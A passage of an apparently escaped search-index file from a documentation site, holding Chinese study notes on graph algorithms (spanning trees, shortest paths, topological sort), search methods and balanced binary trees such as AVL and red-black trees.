<p>\u52a0\u6743\u90bb\u63a5\u77e9\u9635\uff1a\u76f8\u8fde\u4e3aw\uff0c\u4e0d\u76f8\u8fde\u4e3a\u221e</p> <p>\u90bb\u63a5\u8868 </p> <p>\u7528\u9876\u70b9\u6570\u7ec4\u8868\u3001\u8fb9\uff08\u5f27\uff09\u8868\u8868\u793a\u8be5\u6709\u5411\u56fe\u6216\u65e0\u5411\u56fe</p> <p>\u9876\u70b9\u6570\u7ec4\u8868\uff1a\u7528\u6570\u7ec4\u5b58\u653e\u6240\u6709\u7684\u9876\u70b9\u3002\u6570\u7ec4\u5927\u5c0f\u4e3a\u56fe\u9876\u70b9\u6570n</p> <p>\u8fb9\u8868\uff08\u8fb9\u7ed3\u70b9\u8868\uff09\uff1a\u6bcf\u6761\u8fb9\u7528\u4e00\u4e2a\u7ed3\u70b9\u8fdb\u884c\u8868\u793a\u3002\u540c\u4e00\u4e2a\u7ed3\u70b9\u7684\u6240\u6709\u7684\u8fb9\u5f62\u6210\u5b83\u7684\u8fb9\u7ed3\u70b9\u5355\u94fe\u8868\u3002  </p> <p>n\u4e2a\u9876\u70b9\u7684\u65e0\u5411\u56fe\u7684\u90bb\u63a5\u8868\u6700\u591a\u6709n(n-1)\u4e2a\u8fb9\u8868\u7ed3\u70b9\u3002\u6709n\u4e2a\u9876\u70b9\u7684\u65e0\u5411\u56fe\u6700\u591a\u6709n*(n-1)/2\u6761\u8fb9\uff0c\u6b64\u65f6\u4e3a\u5b8c\u5168\u65e0\u5411\u56fe\uff0c\u800c\u5728\u90bb\u63a5\u8868\u4e2d\u6bcf\u6761\u8fb9\u5b58\u50a8\u4e24\u6b21\uff0c\u6240\u4ee5\u6709n*(n-1)\u4e2a\u7ed3\u70b9</p> <p>\u56fe\u7684\u904d\u5386</p> <p>\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u5229\u7528\u6808\uff0c\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u5229\u7528\u961f\u5217</p> <p>\u6c42\u4e00\u6761\u4ece\u9876\u70b9i\u5230\u9876\u70b9s\u7684\u7b80\u5355\u8def\u5f84\u2013\u6df1\u641c\u3002\u6c42\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u7684\u4e00\u6761\u957f\u5ea6\u6700\u77ed\u7684\u8def\u5f84\u2013\u5e7f\u641c\u3002\u5f53\u5404\u8fb9\u4e0a\u7684\u6743\u503c\u5747\u76f8\u7b49\u65f6,BFS\u7b97\u6cd5\u53ef\u7528\u6765\u89e3\u51b3\u5355\u6e90\u6700\u77ed\u8def\u5f84\u95ee\u9898\u3002</p> <p>\u751f\u6210\u6811\u548c\u6700\u5c0f\u751f\u6210\u6811</p> <p>\u6bcf\u6b21\u904d\u5386\u4e00\u4e2a\u8fde\u901a\u56fe\u5c06\u56fe\u7684\u8fb9\u5206\u6210\u904d\u5386\u6240\u7ecf\u8fc7\u7684\u8fb9\u548c\u6ca1\u6709\u7ecf\u8fc7\u7684\u8fb9\u4e24\u90e8\u5206\uff0c\u5c06\u904d\u5386\u7ecf\u8fc7\u7684\u8fb9\u540c\u56fe\u7684\u9876\u70b9\u6784\u6210\u4e00\u4e2a\u5b50\u56fe\uff0c\u8be5\u5b50\u56fe\u79f0\u4e3a\u751f\u6210\u6811\u3002\u56e0\u6b64\u6709DFS\u751f\u6210\u6811\u548cBFS\u751f\u6210\u6811\u3002</p> <p>\u751f\u6210\u6811\u662f\u8fde\u901a\u56fe\u7684\u6781\u5c0f\u5b50\u56fe\uff0c\u6709n\u4e2a\u9876\u70b9\u7684\u8fde\u901a\u56fe\u7684\u751f\u6210\u6811\u5fc5\u5b9a\u6709n-1\u6761\u8fb9,\u5728\u751f\u6210\u6811\u4e2d\u4efb\u610f\u589e\u52a0\u4e00\u6761\u8fb9\uff0c\u5fc5\u5b9a\u4ea7\u751f\u56de\u8def\u3002\u82e5\u780d\u53bb\u5b83\u7684\u4e00\u6761\u8fb9\uff0c\u5c31\u4f1a\u628a\u751f\u6210\u6811\u53d8\u6210\u975e\u8fde\u901a\u5b50\u56fe</p> <p>\u6700\u5c0f\u751f\u6210\u6811\uff1a\u751f\u6210\u6811\u4e2d\u8fb9\u7684\u6743\u503c(\u4ee3\u4ef7)\u4e4b\u548c\u6700\u5c0f\u7684\u6811\u3002\u6700\u5c0f\u751f\u6210\u6811\u95ee\u9898\u662f\u6784\u9020\u8fde\u901a\u7f51\u7684\u6700\u5c0f\u4ee3\u4ef7\u751f\u6210\u6811\u3002</p> <p>Kruskal\u7b97\u6cd5\uff1a\u4ee4\u6700\u5c0f\u751f\u6210\u6811\u96c6\u5408T\u521d\u59cb\u72b6\u6001\u4e3a\u7a7a\uff0c\u5728\u6709n\u4e2a\u9876\u70b9\u7684\u56fe\u4e2d\u9009\u53d6\u4ee3\u4ef7\u6700\u5c0f\u7684\u8fb9\u5e76\u4ece\u56fe\u4e2d\u5220\u53bb\u3002\u82e5\u8be5\u8fb9\u52a0\u5230T\u4e2d\u6709\u56de\u8def\u5219\u4e22\u5f03\uff0c\u5426\u5219\u7559\u5728T\u4e2d\uff1b\u4f9d\u6b64\u7c7b\u63a8\uff0c\u76f4\u81f3T\u4e2d\u6709n-1\u6761\u8fb9\u4e3a\u6b62\u3002</p> <p>Prim\u7b97\u6cd5\u3001Kruskal\u7b97\u6cd5\u548cDijkstra\u7b97\u6cd5\u5747\u5c5e\u4e8e\u8d2a\u5fc3\u7b97\u6cd5\u3002</p> <p>Dijkstra\u7b97\u6cd5\u89e3\u51b3\u7684\u662f\u5e26\u6743\u91cd\u7684\u6709\u5411\u56fe\u4e0a\u5355\u6e90\u6700\u77ed\u8def\u5f84\u95ee\u9898\uff0c\u8be5\u7b97\u6cd5\u8981\u6c42\u6240\u6709\u8fb9\u7684\u6743\u91cd\u90fd\u4e3a\u975e\u8d1f\u503c\u3002</p> <p>Dijkstra\u7b97\u6cd5\u89e3\u51b3\u4e86\u4ece\u67d0\u4e2a\u539f\u70b9\u5230\u5176\u4f59\u5404\u9876\u70b9\u7684\u6700\u77ed\u8def\u5f84\u95ee\u9898\uff0c\u7531\u5faa\u73af\u5d4c\u5957\u53ef\u77e5\u8be5\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a<code>O(N*N)</code>\u3002\u82e5\u8981\u6c42\u4efb\u4e00\u9876\u70b9\u5230\u5176\u4f59\u6240\u6709\u9876\u70b9\u7684\u6700\u77ed\u8def\u5f84\uff0c\u4e00\u4e2a\u6bd4\u8f83\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u5bf9\u6bcf\u4e2a\u9876\u70b9\u5f53\u505a\u6e90\u70b9\u8fd0\u884c\u4e00\u6b21\u8be5\u7b97\u6cd5\uff0c\u7b49\u4e8e\u5728\u539f\u6709\u7b97\u6cd5\u7684\u57fa\u7840\u4e0a\uff0c\u518d\u6765\u4e00\u6b21\u5faa\u73af\uff0c\u6b64\u65f6\u6574\u4e2a\u7b97\u6cd5\u7684\u590d\u6742\u5ea6\u5c31\u53d8\u6210\u4e86<code>O(N*N*N)</code>\u3002</p> <p>Bellman-Ford\u7b97\u6cd5\u89e3\u51b3\u7684\u662f\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u5355\u6e90\u6700\u77ed\u8def\u5f84\u95ee\u9898\uff0c\u5728\u8fd9\u91cc\uff0c\u8fb9\u7684\u6743\u91cd\u53ef\u4ee5\u4e3a\u8d1f\u503c\u3002\u8be5\u7b97\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u4ee5\u8868\u660e\u662f\u5426\u5b58\u5728\u4e00\u4e2a\u4ece\u6e90\u8282\u70b9\u53ef\u4ee5\u5230\u8fbe\u7684\u6743\u91cd\u4e3a\u8d1f\u503c\u7684\u73af\u8def\u3002\u5982\u679c\u5b58\u5728\u8fd9\u6837\u4e00\u4e2a\u73af\u8def\uff0c\u7b97\u6cd5\u5c06\u544a\u8bc9\u6211\u4eec\u4e0d\u5b58\u5728\u89e3\u51b3\u65b9\u6848\u3002\u5982\u679c\u6ca1\u6709\u8fd9\u79cd\u73af\u8def\u5b58\u5728\uff0c\u7b97\u6cd5\u5c06\u7ed9\u51fa\u6700\u77ed\u8def\u5f84\u548c\u5b83\u4eec\u7684\u6743\u91cd\u3002</p> <p>\u53cc\u8fde\u901a\u56fe\u548c\u5173\u8282\u70b9</p> <p>\u82e5\u4ece\u4e00\u4e2a\u8fde\u901a\u56fe\u4e2d\u5220\u53bb\u4efb\u4f55\u4e00\u4e2a\u9876\u70b9\u53ca\u5176\u76f8\u5173\u8054\u7684\u8fb9\uff0c\u5b83\u4ecd\u4e3a\u4e00\u4e2a\u8fde\u901a\u56fe\u7684\u8bdd\uff0c\u5219\u8be5\u8fde\u901a\u56fe\u88ab\u79f0\u4e3a\u91cd\uff08\u53cc\uff09\u8fde\u901a\u56fe\u3002</p> <p>\u82e5\u8fde\u901a\u56fe\u4e2d\u7684\u67d0\u4e2a\u9876\u70b9\u548c\u5176\u76f8\u5173\u8054\u7684\u8fb9\u88ab\u5220\u53bb\u4e4b\u540e\uff0c\u8be5\u8fde\u901a\u56fe\u88ab\u5206\u5272\u6210\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u8fde\u901a\u5206\u91cf\uff0c\u5219\u79f0\u6b64\u9876\u70b9\u4e3a\u5173\u8282\u70b9\u3002</p> <p>\u6ca1\u6709\u5173\u8282\u70b9\u7684\u8fde\u901a\u56fe\u4e3a\u53cc\u8fde\u901a\u56fe</p> <p>\u82e5\u751f\u6210\u6811\u7684\u6839\u7ed3\u70b9\uff0c\u6709\u4e24\u4e2a\u6216\u4e24\u4e2a\u4ee5\u4e0a\u7684\u5206\u652f\uff0c\u5219\u6b64\u9876\u70b9(\u751f\u6210\u6811\u7684\u6839)\u5fc5\u4e3a\u5173\u8282\u70b9\uff1b</p> <p>\u5bf9\u751f\u6210\u6811\u4e0a\u7684\u4efb\u610f\u4e00\u4e2a\u975e\u53f6\u201c\u9876\u70b9\u201d\uff0c\u82e5\u5176\u67d0\u68f5\u5b50\u6811\u4e2d\u7684\u6240\u6709\u201c\u9876\u70b9\u201d\u6ca1\u6709\u548c\u5176\u7956\u5148\u76f8\u901a\u7684\u56de\u8fb9\uff0c\u5219\u8be5\u201c\u9876\u70b9\u201d\u5fc5\u4e3a\u5173\u8282\u70b9\u3002</p> <p>\u6709\u5411\u65e0\u73af\u56fe\u53ca\u5176\u5e94\u7528</p> <p>\u62d3\u6251\u6392\u5e8f\u3002\u5728\u7528\u90bb\u63a5\u8868\u8868\u793a\u56fe\u65f6,\u5bf9\u6709n\u4e2a\u9876\u70b9\u548ce\u6761\u5f27\u7684\u6709\u5411\u56fe\u800c\u8a00\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(n+e)\u3002\u4e00\u4e2a\u6709\u5411\u56fe\u80fd\u88ab\u62d3\u6251\u6392\u5e8f\u7684\u5145\u8981\u6761\u4ef6\u5c31\u662f\u5b83\u662f\u4e00\u4e2a\u6709\u5411\u65e0\u73af\u56fe\u3002\u62d3\u6251\u5e8f\u5217\u552f\u4e00\u4e0d\u80fd\u552f\u4e00\u786e\u5b9a\u6709\u5411\u56fe\u3002</p> <p>AOV\u7f51(Activity On Vertex)\uff1a\u7528\u9876\u70b9\u8868\u793a\u6d3b\u52a8\uff0c\u8fb9\u8868\u793a\u6d3b\u52a8\u7684\u4f18\u5148\u5173\u7cfb\u7684\u6709\u5411\u56fe\u79f0\u4e3aAOV\u7f51\u3002AOV\u7f51\u4e2d\u4e0d\u5141\u8bb8\u6709\u56de\u8def\uff0c\u8fd9\u610f\u5473\u7740\u67d0\u9879\u6d3b\u52a8\u4ee5\u81ea\u5df1\u4e3a\u5148\u51b3\u6761\u4ef6\u3002 </p> <p>\u62d3\u6251\u6709\u5e8f\u5e8f\u5217\uff1a\u628aAOV\u7f51\u7edc\u4e2d\u5404\u9876\u70b9\u6309\u7167\u5b83\u4eec\u76f8\u4e92\u4e4b\u95f4\u7684\u4f18\u5148\u5173\u7cfb\u6392\u5217\u4e00\u4e2a\u7ebf\u6027\u5e8f\u5217\u7684\u8fc7\u7a0b\u3002\u82e5vi\u662fvj\u524d\u9a71\uff0c\u5219vi\u4e00\u5b9a\u5728vj\u4e4b\u524d\uff1b\u5bf9\u4e8e\u6ca1\u6709\u4f18\u5148\u5173\u7cfb\u7684\u70b9\uff0c\u987a\u5e8f\u4efb\u610f\u3002</p> <p>\u62d3\u6251\u6392\u5e8f\uff1a\u5bf9AOV\u7f51\u7edc\u4e2d\u9876\u70b9\u6784\u9020\u62d3\u6251\u6709\u5e8f\u5e8f\u5217\u7684\u8fc7\u7a0b\u3002\u65b9\u6cd5\uff1a</p> <p>\u5728\u6709\u5411\u56fe\u4e2d\u9009\u4e00\u4e2a\u6ca1\u6709\u524d\u9a71\u7684\u9876\u70b9\u4e14\u8f93\u51fa\u4e4b</p> <p>\u4ece\u56fe\u4e2d\u5220\u9664\u8be5\u9876\u70b9\u548c\u6240\u6709\u4ee5\u5b83\u4e3a\u5c3e\u7684\u5f27</p> <p>\u91cd\u590d\u4e0a\u8ff0\u4e24\u6b65\uff0c\u76f4\u81f3\u5168\u90e8\u9876\u70b9\u5747\u5df2\u8f93\u51fa\uff1b\u6216\u8005\u5f53\u56fe\u4e2d\u4e0d\u5b58\u5728\u65e0\u524d\u9a71\u7684\u9876\u70b9\u4e3a\u6b62(\u6b64\u65f6\u8bf4\u660e\u56fe\u4e2d\u6709\u73af\uff09</p> <p>\u91c7\u7528\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u6216\u62d3\u6251\u6392\u5e8f\u7b97\u6cd5\u53ef\u4ee5\u5224\u65ad\u51fa\u4e00\u4e2a\u6709\u5411\u56fe\u4e2d\u662f\u5426\u6709\u73af(\u56de\u8def).\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u53ea\u8981\u5728\u5176\u4e2d\u8bb0\u5f55\u4e0b\u641c\u7d22\u7684\u8282\u70b9\u6570n\uff0c\u5f53n\u5927\u4e8e\u56fe\u4e2d\u8282\u70b9\u6570\u65f6\u9000\u51fa\uff0c\u5e76\u53ef\u4ee5\u5f97\u51fa\u6709\u56de\u8def\u3002\u82e5\u6709\u56de\u8def\uff0c\u5219\u62d3\u6251\u6392\u5e8f\u8bbf\u95ee\u4e0d\u5230\u56fe\u4e2d\u6240\u6709\u7684\u8282\u70b9\uff0c\u6240\u4ee5\u4e5f\u53ef\u4ee5\u5f97\u51fa\u56de\u8def\u3002\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u8fc7\u7a0b\u4e2d\u5982\u679c\u8bbf\u95ee\u5230\u4e00\u4e2a\u5df2\u7ecf\u8bbf\u95ee\u8fc7\u7684\u8282\u70b9\uff0c\u53ef\u80fd\u662f\u591a\u4e2a\u8282\u70b9\u6307\u5411\u8fd9\u4e2a\u8282\u70b9\uff0c\u4e0d\u4e00\u5b9a\u662f\u5b58\u5728\u73af\u3002</p> <p>\u7b97\u6cd5\u63cf\u8ff0\uff1a</p> <p>\u628a\u90bb\u63a5\u8868\u4e2d\u5165\u5ea6\u4e3a0\u7684\u9876\u70b9\u4f9d\u6b64\u8fdb\u6808</p> <p>\u82e5\u6808\u4e0d\u7a7a\uff0c\u5219 </p> <p>\u6808\u9876\u5143\u7d20vj\u9000\u6808\u5e76\u8f93\u51fa\uff1b</p> <p>\u5728\u90bb\u63a5\u8868\u4e2d\u67e5\u627evj\u7684\u76f4\u63a5\u540e\u7ee7vk\uff0c\u628avk\u7684\u5165\u5ea6\u51cf1\uff1b\u82e5vk\u7684\u5165\u5ea6\u4e3a0\u5219\u8fdb\u6808</p> <p>\u82e5\u6808\u7a7a\u65f6\u8f93\u51fa\u7684\u9876\u70b9\u4e2a\u6570\u4e0d\u662fn\uff0c\u5219\u6709\u5411\u56fe\u6709\u73af\uff1b\u5426\u5219\uff0c\u62d3\u6251\u6392\u5e8f\u5b8c\u6bd5\u3002</p> <p>AOE\u7f51\uff1a\u5e26\u6743\u7684\u6709\u5411\u65e0\u73af\u56fe\uff0c\u5176\u4e2d\u9876\u70b9\u8868\u793a\u4e8b\u4ef6\uff0c\u5f27\u8868\u793a\u6d3b\u52a8\uff0c\u6743\u8868\u793a\u6d3b\u52a8\u6301\u7eed\u65f6\u95f4\u3002\u5728\u5de5\u7a0b\u4e0a\u5e38\u7528\u6765\u8868\u793a\u5de5\u7a0b\u8fdb\u5ea6\u8ba1\u5212\u3002</p> <p>\u4e00\u4e9b\u5b9a\u4e49\uff1a</p> <p>\u4e8b\u4ef6\u7684\u6700\u65e9\u53d1\u751f\u65f6\u95f4\uff08ve(j)\uff09\uff1a\u4ece\u6e90\u70b9\u5230j\u7ed3\u70b9\u7684\u6700\u957f\u7684\u8def\u5f84\u3002\u610f\u5473\u7740\u4e8b\u4ef6\u6700\u65e9\u80fd\u591f\u53d1\u751f\u7684\u65f6\u95f4\u3002</p> <p>\u4e8b\u4ef6\u7684\u6700\u8fdf\u53d1\u751f\u65f6\u95f4\uff08vl(j)\uff09\uff1a\u4e0d\u5f71\u54cd\u5de5\u7a0b\u7684\u5982\u671f\u5b8c\u5de5\uff0c\u4e8b\u4ef6j\u5fc5\u987b\u53d1\u751f\u7684\u65f6\u95f4\u3002</p> <p>\u6d3b\u52a8ai\u7531\u5f27</p> <p>\u67e5\u627e</p> <p>\u987a\u5e8f\u67e5\u627e\u3001\u6298\u534a\u67e5\u627e\u3001\u7d22\u5f15\u67e5\u627e\u3001\u5206\u5757\u67e5\u627e\u662f\u9759\u6001\u67e5\u627e\uff0c\u52a8\u6001\u67e5\u627e\u6709\u4e8c\u53c9\u6392\u5e8f\u6811\u67e5\u627e\uff0c\u6700\u4f18\u4e8c\u53c9\u6811\u67e5\u627e\uff0c\u952e\u6811\u67e5\u627e\uff0c\u54c8\u5e0c\u8868\u67e5\u627e</p> <p>\u9759\u6001\u67e5\u627e\u8868</p> <p>\u987a\u5e8f\u8868\u7684\u987a\u5e8f\u67e5\u627e\uff1a\u5e94\u7528\u8303\u56f4\uff1a\u987a\u5e8f\u8868\u6216\u7ebf\u6027\u94fe\u8868\u8868\u793a\u7684\u8868\uff0c\u8868\u5185\u5143\u7d20\u4e4b\u95f4\u65e0\u5e8f\u3002\u67e5\u627e\u8fc7\u7a0b\uff1a\u4ece\u8868\u7684\u4e00\u7aef\u5f00\u59cb\u9010\u4e2a\u8fdb\u884c\u8bb0\u5f55\u7684\u5173\u952e\u5b57\u548c\u7ed9\u5b9a\u503c\u7684\u6bd4\u8f83\u3002</p> <p>\u987a\u5e8f\u6709\u5e8f\u8868\u7684\u4e8c\u5206\u67e5\u627e\u3002\u5e73\u5747\u67e5\u627e\u65f6\u95f4(n+1)/n log2(n+1)</p> <p>\u5206\u5757\u67e5\u627e\uff1a\u5c06\u8868\u5206\u6210\u51e0\u5757\uff0c\u5757\u5185\u65e0\u5e8f\uff0c\u5757\u95f4\u6709\u5e8f\uff0c\u5373\u524d\u4e00\u5757\u4e2d\u7684\u6700\u5927\u503c\u5c0f\u4e8e\u540e\u4e00\u5757\u4e2d\u7684\u6700\u5c0f\u503c\u3002\u5e76\u4e14\u6709\u4e00\u5f20\u7d22\u5f15\u8868\uff0c\u6bcf\u4e00\u9879\u5b58\u653e\u6bcf\u4e00\u5757\u7684\u6700\u5927\u503c\u548c\u6307\u5411\u8be5\u5757\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u6307\u9488\u3002\u7d22\u5f15\u8868\u6709\u5e8f\uff0c\u5757\u5185\u65e0\u5e8f\u3002\u6240\u4ee5\uff0c\u5757\u95f4\u67e5\u627e\u7528\u4e8c\u5206\u67e5\u627e\uff0c\u5757\u5185\u7528\u987a\u5e8f\u67e5\u627e\uff0c\u6548\u7387\u4ecb\u4e8e\u987a\u5e8f\u548c\u4e8c\u5206\u4e4b\u95f4\uff1b\u5148\u786e\u5b9a\u5f85\u67e5\u8bb0\u5f55\u6240\u5728\u5757\uff0c\u518d\u5728\u5757\u5185\u67e5\u627e\u3002\u56e0\u6b64\u8ddf\u8868\u4e2d\u5143\u7d20\u4e2a\u6570\u548c\u5757\u4e2d\u5143\u7d20\u4e2a\u6570\u90fd\u6709\u5173\u3002</p> <p>\u7528\u6570\u7ec4\u5b58\u653e\u5f85\u67e5\u8bb0\u5f55,</p> <p>\u5efa\u7acb\u7d22\u5f15\u8868\uff0c\u7531\u6bcf\u5757\u4e2d\u6700\u5927\uff08\u5c0f\uff09\u7684\u5173\u952e\u5b57\u53ca\u6240\u5c5e\u5757\u4f4d\u7f6e\u7684\u4fe1\u606f\u7ec4\u6210\u3002</p> <p>\u5f53\u7d22\u5f15\u8868\u8f83\u5927\u65f6\uff0c\u53ef\u4ee5\u91c7\u7528\u4e8c\u5206\u67e5\u627e</p> <p>\u5728\u6570\u636e\u91cf\u6781\u5927\u65f6\uff0c\u7d22\u5f15\u53ef\u80fd\u5f88\u591a\uff0c\u53ef\u8003\u8651\u5efa\u7acb\u7d22\u5f15\u8868\u7684\u7d22\u5f15\uff0c\u5373\u4e8c\u7ea7\u7d22\u5f15\uff0c\u539f\u5219\u4e0a\u7d22\u5f15\u4e0d\u8d85\u8fc7\u4e09\u7ea7</p> <p>\u5206\u5757\u67e5\u627e\u5e73\u5747\u67e5\u627e\u957f\u5ea6\uff1aASLbs = Lb + Lw\u3002\u5176\u4e2d\uff0cLb\u662f\u67e5\u627e\u7d22\u5f15\u8868\u786e\u5b9a\u6240\u5728\u5757\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\uff0c Lw\u662f\u5728\u5757\u4e2d\u67e5\u627e\u5143\u7d20\u7684\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u3002\u5728n\u4e00\u5b9a\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u9009\u62e9s\u4f7fASL\u5c3d\u53ef\u80fd\u5c0f\u3002\u5f53s=sqrt(n)\u65f6\uff0cASL\u6700\u5c0f\u3002</p> <p>\u65f6\u95f4\uff1a\u987a\u5e8f\u67e5\u627e\u6700\u5dee\uff0c\u4e8c\u5206\u6700\u597d\uff0c\u5206\u5757\u4ecb\u4e8e\u4e24\u8005\u4e4b\u95f4</p> <p>\u7a7a\u95f4\uff1a\u5206\u5757\u6700\u5927\uff0c\u9700\u8981\u589e\u52a0\u7d22\u5f15\u6570\u636e\u7684\u7a7a\u95f4</p> <p>\u987a\u5e8f\u67e5\u627e\u5bf9\u8868\u6ca1\u6709\u7279\u6b8a\u8981\u6c42  </p> <p>\u5206\u5757\u65f6\u6570\u636e\u5757\u4e4b\u95f4\u5728\u7269\u7406\u4e0a\u53ef\u4e0d\u8fde\u7eed\u3002\u6240\u4ee5\u53ef\u4ee5\u8fbe\u5230\u63d2\u5165\u3001\u5220\u9664\u6570\u636e\u53ea\u6d89\u53ca\u5bf9\u5e94\u7684\u5757\uff1b\u53e6\u5916\uff0c\u589e\u52a0\u4e86\u7d22\u5f15\u7684\u7ef4\u62a4\u3002</p> <p>\u4e8c\u5206\u67e5\u627e\u8981\u6c42\u8868\u6709\u5e8f\uff0c\u6240\u4ee5\u82e5\u8868\u7684\u5143\u7d20\u7684\u63d2\u5165\u4e0e\u5220\u9664\u5f88\u9891\u7e41\uff0c\u7ef4\u6301\u8868\u6709\u5e8f\u7684\u5de5\u4f5c\u91cf\u6781\u5927\u3002</p> <p>\u5728\u8868\u4e0d\u5927\u65f6\uff0c\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u987a\u5e8f\u67e5\u627e\u3002</p>"},{"location":"other/data%20structure%20basic/#_4","title":"\u52a8\u6001\u67e5\u627e","text":"<p>\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u7ed3\u70b9\u5220\u9664\uff1a</p> <p>x\u4e3a\u53f6\u5b50\u7ed3\u70b9\uff0c\u5219\u76f4\u63a5\u5220\u9664</p> <p>x\u53ea\u6709\u5de6\u5b50\u6811xL\u6216\u53ea\u6709\u53f3\u5b50\u6811xR ,\u5219\u4ee4xL\u6216xR\u76f4\u63a5\u6210\u4e3a\u53cc\u4eb2\u7ed3\u70b9f\u7684\u5b50\u6811\uff1b </p> <p>x\u5373\u6709\u5de6\u5b50\u6811xL\u4e5f\u6709\u53f3\u5b50\u6811xR\uff0c\u5728xL\u4e2d\u9009\u503c\u6700\u5927\u7684\u4ee3\u66ffx\uff0c\u8be5\u6570\u636e\u6309\u4e8c\u53c9\u6392\u5e8f\u6811\u7684\u6027\u8d28\u5e94\u5728\u6700\u53f3\u8fb9\u3002</p> <p>\u5e73\u8861\u4e8c\u53c9\u6811\uff1a\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5e73\u8861\u56e0\u5b50\u90fd\u4e3a 1\u3001\uff0d1\u30010 \u7684\u4e8c\u53c9\u6392\u5e8f\u6811\u3002\u6216\u8005\u8bf4\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5de6\u53f3\u5b50\u6811\u7684\u9ad8\u5ea6\u6700\u591a\u5dee1\u7684\u4e8c\u53c9\u6392\u5e8f\u6811\u3002</p> <p>\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u5e73\u8861\uff1a</p> <p>\u5de6\u8c03\u6574(\u65b0\u7ed3\u70b9\u63d2\u5165\u5728\u5de6\u5b50\u6811\u4e0a\u7684\u8c03\u6574)\uff1a </p> <p>LL(\u63d2\u5165\u5728\u7ed3\u70b9\u5de6\u5b50\u6811\u7684\u5de6\u5b50\u6811\u4e0a)\uff1a\u65cb\u8f6c\u524d\u540e\u9ad8\u5ea6\u90fd\u4e3ah+1</p> <p>LR(\u65b0\u63d2\u5165\u7ed3\u70b9\u5728\u5de6\u5b50\u6811\u7684\u53f3\u5b50\u6811\u4e0a)\uff1a\u65cb\u8f6c\u524d\u540e\u9ad8\u5ea6\u4ecd\u4e3ah+1</p> <p>\u53f3\u8c03\u6574(\u65b0\u7ed3\u70b9\u63d2\u5165\u5728\u53f3\u5b50\u6811\u4e0a\u8fdb\u884c\u7684\u8c03\u6574): </p> <p>RR(\u63d2\u5165\u5728\u7684\u53f3\u5b50\u6811\u7684\u53f3\u5b50\u6811\u4e0a)\uff1a\u5904\u7406\u65b9\u6cd5\u548c LL\u5bf9\u79f0</p> <p>RL(\u63d2\u5165\u5728\u7684\u53f3\u5b50\u6811\u7684\u5de6\u5b50\u6811\u4e0a)\uff1a\u5904\u7406\u65b9\u6cd5\u548c LR\u5bf9\u79f0</p> <p>\u5e73\u8861\u6811\u5efa\u7acb\u65b9\u6cd5\uff1a</p> <p>\u6309\u4e8c\u53c9\u6392\u5e8f\u6811\u63d2\u5165\u7ed3\u70b9</p> <p>\u5982\u5f15\u8d77\u7ed3\u70b9\u5e73\u8861\u56e0\u5b50\u53d8\u4e3a|2|\uff0c\u5219\u786e\u5b9a\u65cb\u8f6c\u70b9\uff0c\u8be5\u70b9\u662f\u79bb\u6839\u6700\u8fdc\uff08\u6216\u6700\u63a5\u8fd1\u4e8e\u53f6\u5b50\u7684\u70b9\uff09</p> <p>\u786e\u5b9a\u5e73\u8861\u7c7b\u578b\u540e\u8fdb\u884c\u5e73\u8861\u5904\u7406\uff0c\u5e73\u8861\u540e\u4ee5\u5e73\u8861\u70b9\u4e3a\u6839\u7684\u5b50\u6811\u9ad8\u4e0d\u53d8</p> <p>\u6700\u5c0f\u4e8c\u53c9\u5e73\u8861\u6811\u7684\u8282\u70b9\u7684\u516c\u5f0f\u5982\u4e0b F(n)=F(n-1)+F(n-2)+1 \u8fd9\u4e2a\u7c7b\u4f3c\u4e8e\u4e00\u4e2a\u9012\u5f52\u7684\u6570\u5217\uff0c\u53ef\u4ee5\u53c2\u8003Fibonacci\u6570\u5217\uff0c1\u662f\u6839\u8282\u70b9\uff0cF(n-1)\u662f\u5de6\u5b50\u6811\u7684\u8282\u70b9\u6570\u91cf\uff0cF(n-2)\u662f\u53f3\u5b50\u6811\u7684\u8282\u70b9\u6570\u91cf\u3002</p>"},{"location":"other/data%20structure%20basic/#_5","title":"\u5e38\u89c1\u7684\u5e73\u8861\u4e8c\u53c9\u6811\uff1a","text":"<p>\u7ea2\u9ed1\u6811\u662f\u5e73\u8861\u4e8c\u53c9\u6811\uff0c\u4e5f\u5c31\u662f\u5de6\u53f3\u5b50\u6811\u662f\u5e73\u8861\u7684\uff0c\u9ad8\u5ea6\u5927\u6982\u76f8\u7b49\u3002\u8fd9\u79cd\u60c5\u51b5\u7b49\u4ef7\u4e8e\u4e00\u5757\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\uff0c\u67e5\u627e\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662f\u6811\u7684\u9ad8\u5ea6\uff0c\u4e3alogn\uff0c\u63d2\u5165\u64cd\u4f5c\u7684\u5e73\u5747\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)\uff0c\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u4e3aO(logn) </p> <p>\u8282\u70b9\u662f\u7ea2\u8272\u6216\u9ed1\u8272\u3002</p> <p>\u6839\u662f\u9ed1\u8272\u3002</p> <p>\u6240\u6709\u53f6\u5b50\u90fd\u662f\u9ed1\u8272\uff08\u53f6\u5b50\u662fNIL\u8282\u70b9\uff09\u3002</p> 